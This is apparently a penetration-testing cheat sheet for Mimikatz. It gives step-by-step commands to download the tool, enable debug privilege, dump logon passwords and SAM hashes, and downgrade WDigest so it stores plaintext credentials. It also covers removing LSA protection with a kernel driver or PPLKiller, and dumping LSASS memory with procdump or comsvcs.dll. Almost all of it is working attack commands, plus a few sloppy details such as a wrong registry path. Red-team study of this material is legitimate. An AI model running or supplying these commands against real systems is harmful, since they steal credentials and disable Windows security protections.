# Mimikatz

## 01 - Setup

```
PS C:\> Invoke-WebRequest -UseBasicParsing -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile mimikatz_trunk.zip
Expand-Archive .\mimikatz_trunk.zip
cd mimikatz_trunk\x64
.\mimikatz.exe
```

## 02 - Help Menu

TODO: Copy and paste the help menu for mimikatz

```
mimikatz # ::
```

## 03 - Usage

### 3.1 - LogonPasswords

Make sure the `SeDebugPrivilege` is enabled

```
C:\> whoami /priv
Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Enabled

mimikatz # privilege::debug
Privilege '20' OK
```

Audit by logging the file

```
mimikatz # log credentials.txt

mimikatz # sekurlsa::logonpasswords
```

If you receive this error

```
mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
```

Go to the **Group Policy Management Editor** -> Windows Settings -> Security Settings -> Local Policies -> User Rights Assignment -> Debug programs -> then uncheck the box **"Define these policy settings:"**

### 3.2 - SAM

```
mimikatz # lsadump::sam
```

### 3.3 - Enable Wdigest

Otherwise another way around it is to dump with **WDigest**

```
mimikatz # sekurlsa::wdigest
```

If you receive this error

```
mimikatz # sekurlsa::wdigest
ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
```

Simply downgrades to enable mimikatz to retrieve the credentials of the windows workstation

```
C:\> reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

PS C:\> Set-ItemProperty -Force -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value "1"
```

### 3.4 - Disable LSA Protection

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_privilege_acquireLSA ; Handle on memory (0x00000005)
```

```
C:\> reg.exe query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
```

```
PS C:\> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Lsa -Name "RunAsPPL"

RunAsPL     : 1
```

- Method 1:

```
mimikatz # !+
```

Create and start a `mimidrv` service

```
C:\> sc create mimidrv binpath= C:\path\to\mimidrv.sys type= kernel start= demand

C:\> sc start mimidrv
```

```
mimikatz # !processprotect /process:lsass.exe /remove

mimikatz # privilege::debug

mimikatz # sekurlsa::logonpasswords

mimikatz # !processprotect /process:lsass.exe

mimikatz # !-
```

- Method 2:

```
C:\> PPLKiller.exe /installDriver

C:\> PPLKiller.exe /disableLSAProtection

C:\> PPLKiller.exe /uninstallDriver
```

### 3.5 - Dump LSASS Process

Check if the LSASS process is present

```
C:\> tasklist /fi "imagename eq lsass.exe"

PS C:\> get-process lsass
```

#### 3.5.1 - Dump the process memory

- **Method 1:** Use the legit sysinternal tool

```
C:\> procdump.exe /accepteula -ma <lsass_pid> hashmem.dmp

C:\> procdump.exe /accepteula -ma lsass.exe hashmem.dmp

C:\> windbg.exe -p .dump /ma c:\path\to\hashmem.dmp .detach .q
```

- **Method 2:** Living off the Land technique

```
C:\> rundll32.exe comsvcs.dll,Minidump "<lsass_pid> hashmem.dmp full"

PS C:\> rundll32.exe comsvcs.dll,Minidump ((Get-Process lsass).Id) hashmem.dmp full

C:\> c:\windows\system32\rundll32.exe c:\windows\system32\comsvcs.dll,Minidump <lsass_pid> hashmem.dmp full

C:\> powershell.exe -ep bypass Get-Process lsass C:\Windows\System32\Taskmgr.exe /dumpfile=C:\lsass.dmp /pid=<pid>
```

#### 3.5.2 - Dump credentials

- **Method 1:** Using pypykatz

```
$ pypykatz lsa minidump hashmem.dmp

$ pypykatz lsa -k /path/to/file_creds minidump hashmem.dmp
```

- **Method 2:** Directly dump credentials in mimikatz

```
mimikatz # sekurlsa::minidump hashmem.dmp
```

Create a log file

```
mimikatz # log dumpcreds.txt

mimikatz # sekurlsa::logonpasswords
```

---
## References

### Github

- [RedCursorSecurityConsulting: PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)

- [itm4n: PPLdump](https://github.com/itm4n/PPLdump)

- [HarmJ0y: Invoke-WdigestDowngrade.ps1](https://gist.github.com/HarmJ0y/8fdd2d3acfbe79b730db)

- [IgniteTechnologies: Credential Dumping](https://github.com/Ignitetechnologies/Credential-Dumping)

### LOLBAS

- [LOLBAS: Comsvcs](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)

### InfoSec Matter

- [InfoSec Matter: Powershell Commands for Pentesters](https://www.infosecmatter.com/powershell-commands-for-pentesters/)

### ADSecurity

- [Active Directory Security: Unofficial Guide to Mimimkatz & Command Reference](https://adsecurity.org/?page_id=1821)

### Hacking Articles

- [Hacking Articles: Credential Dumping Wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)

### Hades

- [Hades: Mimikatz Comprehensive Guide](https://hadess.io/mimikatz-comprehensive-guide/)

### Itm4na

- [itm4n: LSASS RunAsPPL](https://itm4n.github.io/lsass-runasppl/)

### WhiteOakSecurity

- [WhiteOakSecurity: Attack Defenses Dumping LSASS no Mimikatz](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)

- [FAS Data Security Compliance Program: Russian Government Cyber Activity Targeting Energy and Other Critical Infrastructure Sectors](https://datasecurity.ucsf.edu/news/russian-government-cyber-activity-targeting-energy-and-other-critical-infrastructure-sectors)

- [Configuring Additional LSA Protection](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)

- [RedTeamRecipe: 64 Methods For Execute Mimikatz](https://redteamrecipe.com/64-methods-for-execute-mimikatzrtc0003)